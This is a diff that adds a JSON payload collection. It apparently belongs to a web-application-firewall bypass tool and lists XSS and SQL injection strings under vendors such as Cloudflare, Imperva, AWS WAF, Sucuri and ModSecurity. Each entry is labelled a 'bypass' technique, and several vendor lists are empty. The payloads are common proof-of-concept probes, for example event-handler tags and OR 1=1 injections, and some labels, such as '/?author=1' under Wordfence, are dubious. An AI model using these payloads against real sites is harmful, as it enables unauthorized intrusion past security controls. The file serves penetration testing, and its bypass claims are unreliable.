@@ -1,0 +1,284 @@
+{
+  "360": {
+    "xss": [],
+    "sqli": []
+  },
+  "airlock": {
+    "sqli": []
+  },
+  "aws_waf": {
+    "sqli": [
+      {
+        "payload": "1' OR '1'='1",
+        "technique": "aws_waf bypass",
+        "level": "intermediate"
+      }
+    ],
+    "xss": [
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "aws_waf bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "technique": "aws_waf bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "barracuda": {
+    "xss": [],
+    "rce": []
+  },
+  "cloudbric": {
+    "xss": [
+      {
+        "payload": "<script>alert(1)</script>",
+        "technique": "cloudbric bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "cloudbric bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "cloudflare": {
+    "xss": [
+      {
+        "payload": "<a href=\"j&tab;avascript&newline;:alert(1)\" tabindex=1 autofocus>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<details open ontoggle=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<body onload=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<iframe srcdoc=\"<img src=x onerror=alert(1)>\">",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<select autofocus onfocus=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<textarea autofocus onfocus=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<keygen autofocus onfocus=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<video><source onerror=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<audio><source onerror=alert(1)>",
+        "technique": "cloudflare bypass",
+        "level": "intermediate"
+      }
+    ],
+    "rce": []
+  },
+  "comodo": {
+    "xss": [
+      {
+        "payload": "<script>alert(1)</script>",
+        "technique": "comodo bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "technique": "comodo bypass",
+        "level": "intermediate"
+      }
+    ],
+    "sqli": []
+  },
+  "dotdefender": {
+    "rce": [],
+    "xss": [
+      {
+        "payload": "<script>",
+        "technique": "dotdefender bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "f5_firepass": {
+    "sqli": []
+  },
+  "fortinet": {
+    "xss": [
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "fortinet bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "imperva": {
+    "xss": [
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "imperva bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "technique": "imperva bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<body onload=alert(1)>",
+        "technique": "imperva bypass",
+        "level": "intermediate"
+      }
+    ],
+    "sqli": []
+  },
+  "kona_sitedefender": {
+    "xss": [
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "kona_sitedefender bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<body onload=alert(1)>",
+        "technique": "kona_sitedefender bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<details open ontoggle=alert(1)>",
+        "technique": "kona_sitedefender bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "modsecurity": {
+    "xss": [],
+    "rce": [],
+    "sqli": [
+      {
+        "payload": "1' OR 1=1-- -",
+        "technique": "modsecurity bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "netscaler": {
+    "sqli": [],
+    "xss": [
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "netscaler bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "profense": {
+    "csrf": [],
+    "xss": [
+      {
+        "payload": "<script>",
+        "technique": "profense bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "stackpath": {
+    "xss": [
+      {
+        "payload": "<details open ontoggle=alert(1)>",
+        "technique": "stackpath bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<body onload=alert(1)>",
+        "technique": "stackpath bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "sucuri": {
+    "xss": [
+      {
+        "payload": "<svg onload=alert(1)>",
+        "technique": "sucuri bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<body onload=alert(1)>",
+        "technique": "sucuri bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<details open ontoggle=alert(1)>",
+        "technique": "sucuri bypass",
+        "level": "intermediate"
+      },
+      {
+        "payload": "<input autofocus onfocus=alert(1)>",
+        "technique": "sucuri bypass",
+        "level": "intermediate"
+      }
+    ],
+    "rce": []
+  },
+  "webarx": {
+    "xss": [],
+    "lfi": [],
+    "sqli": []
+  },
+  "webknight": {
+    "xss": [
+      {
+        "payload": "<script>alert(1)</script>",
+        "technique": "webknight bypass",
+        "level": "intermediate"
+      }
+    ],
+    "sqli": [
+      {
+        "payload": "' OR 1=1--",
+        "technique": "webknight bypass",
+        "level": "intermediate"
+      }
+    ]
+  },
+  "wordfence": {
+    "xss": [
+      {
+        "payload": "/?author=1",
+        "technique": "wordfence bypass",
+        "level": "intermediate"
+      }
+    ]
+  }
+}
